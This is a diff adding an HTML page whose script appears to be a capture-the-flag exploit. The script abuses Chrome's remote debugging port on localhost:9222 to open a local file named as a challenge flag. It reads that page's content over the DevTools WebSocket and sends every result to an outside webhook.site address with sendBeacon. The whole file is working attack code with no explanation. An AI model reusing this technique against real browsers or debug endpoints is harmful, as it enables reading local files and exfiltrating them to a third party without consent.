@@ -1,0 +1,48 @@
+
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+function log(...args) {
+  navigator.sendBeacon(
+    'https://webhook.site/23cb13bd-80f6-4d7d-bcce-d3f25ed4cde2',
+    JSON.stringify(args, null, 2)
+  );
+}
+
+const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
+
+const path = '/challenge/flag-53035d3cba0664dfac37ff64b6e0f86e';
+
+(async () => {
+  const res = await fetch(
+    'http://localhost:9222/json/new?file://' + path,
+    { method: 'PUT' }
+  ).then(r => r.json());
+
+  log('new', res);
+
+  const ws = new WebSocket(res.webSocketDebuggerUrl);
+
+  ws.onerror = e => log('wserr', String(e));
+
+  ws.onmessage = e => log('wsmsg', e.data);
+
+  ws.onopen = async () => {
+    log('wsopen');
+    await sleep(500);
+
+    ws.send(JSON.stringify({
+      id: 1,
+      method: 'Runtime.evaluate',
+      params: {
+        expression: 'document.body.innerHTML'
+      }
+    }));
+  };
+})().catch(err => {
+  log('err', err.message, err.stack);
+});
+</script>
+</body>
+</html>
